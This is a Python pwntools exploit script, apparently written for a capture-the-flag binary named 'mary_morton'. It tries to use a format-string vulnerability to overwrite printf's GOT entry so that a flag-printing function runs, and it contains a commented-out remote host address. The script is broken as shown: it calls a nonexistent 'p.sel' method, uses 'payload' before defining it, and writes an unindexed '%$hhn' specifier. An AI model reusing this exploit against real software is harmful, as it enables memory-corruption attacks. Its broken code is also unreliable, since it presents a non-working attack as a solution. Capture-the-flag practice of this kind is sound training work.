# coding=utf-8
from time import sleep
from pwn import * 
context.log_level = 'debug'
context.terminal=["tmux","splitv","-h"]

r      = lambda x: p.recv(x)
ru     = lambda x: p.recvuntil(x)
rud    = lambda x: p.recvuntil(x, drop=True)
se     = lambda x: p.send(x)
sel    = lambda x: p.sendline(x)
pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
pick64 = lambda x: u64(x[:8].ljust(8, '\0'))


# The function that prints the flag
flag_addr = 0x00000000004008DA
# Load the binary in pwntools. This way we don't need to worry about the
# details, just pass it to FormatString
elf = ELF('./mary_morton')
printf_addr=elf.symbols['got.printf']


 
 
def connect():
    global p
    p = process(elf.file.name)
    #p = remote(host='146.185.132.36', port=19153)
    p.recvuntil('Exit the battle \n')
 
 
 
 
def exec_fmt(s):
    p.sendline('2')
    sleep(0.1)
    p.sendline(s)
    ret = p.recvuntil('1. Stack Bufferoverflow', drop=True)
    p.recvuntil('Exit the battle \n')
    return ret
 
 
 
 
# Connect up
connect() 
# Now, instantiate a FormatString class, using the elf and exec_fmt functions
#fmtStr = FormatString(exec_fmt, elf=elf, index=6, pad=0, explore_stack=False)
#fmtStr.write_q(elf.symbols['got.printf'], flag_addr)
p.sendline("2")
sleep(1)
p.sel(payload)
payload=p64(printf_addr)+"%$hhn"
p.recvuntil('Exit the battle \n')
 
p.sendline('1')
p.sendline('1')
 
 
p.interactive()